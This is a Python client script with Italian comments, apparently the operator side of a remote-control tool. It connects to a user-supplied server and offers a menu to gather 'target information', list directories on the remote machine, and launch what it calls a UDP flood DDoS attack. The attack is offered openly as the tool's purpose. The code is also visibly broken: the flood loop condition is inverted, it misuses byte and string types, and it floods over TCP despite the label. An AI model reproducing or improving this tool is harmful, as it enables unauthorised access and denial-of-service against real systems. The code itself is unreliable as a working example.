import socket
import random

SRV_ADDR = input("Inserisci l'IP del server: ")
SVR_PORT = int(input("Inserisci la porta del server: "))
#socket.socket( inet ,tecnologia ->tcp)
my_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
#my_sock.connect((SRV_ADDR, SVR_PORT))

try:
    my_sock.connect((SRV_ADDR, SVR_PORT))
except Exception as e:
    print("Cannot connect to the server:", e)
print("Connected")

def print_menu():
    print("*#"*20)
    print("\n1 -> Ricevere informazioni target")
    print("\n2 -> Esplorare una directory data in input")
    print("\n3 -> esegui un UDP Flood (DDOS attack)")
    print("\n0 -> chiudi la connessione (solo lato client)")
    print("*#"*20)

print ("connessione stabilita \n")

print_menu()

while 1: 
    message = input("\nfai una scelta: ")

    if(message == "0"):
        my_sock.sendall(message.encode())
        my_sock.close()
        break

    elif(message == "1"):
        #mi risponde con un messaggio
        my_sock.sendall(message.encode())
        # lo metto nel mio data, cosi' gestisco l'errore
        data = my_sock.recv(1024)
        if not data: break
        print(data.decode('utf-8'))
    elif(message == "2"):
        path = input("inserisci il path")
        my_sock.sendall(message.encode())
        my_sock.sendall(path.encode())
        data = my_sock.recv(1024)
        #decodo la risposta e creo un array splittando la risposta
        data = data.decode('utf-8').split(',')
        print("*"*40)
        for x in data:
            print(x)
        print("*"*40)
    # is for ddos
    elif(message == "3"):
        print("*"*40)
        occurrencies = input("\nverranno creati pacchetti da 1Kb\nnumero pacchetti da inviare:")
        occurrenceNbr = int(occurrencies)
        while int(occurrenceNbr) == 0:
            occurrenceNbr -= 1
            fakedata = random.randbytes(1024)
            my_sock.sendall(fakedata.encode())
            print("\n" + occurrenceNbr+ " packets remaning")
        #send # to close the connection
        my_sock.sendall("#".encode())
        print ("Tutti i "+occurrencies+" pacchetti sono stati inviati :) ")
    else:
        print("\nbscelta non valida\n")
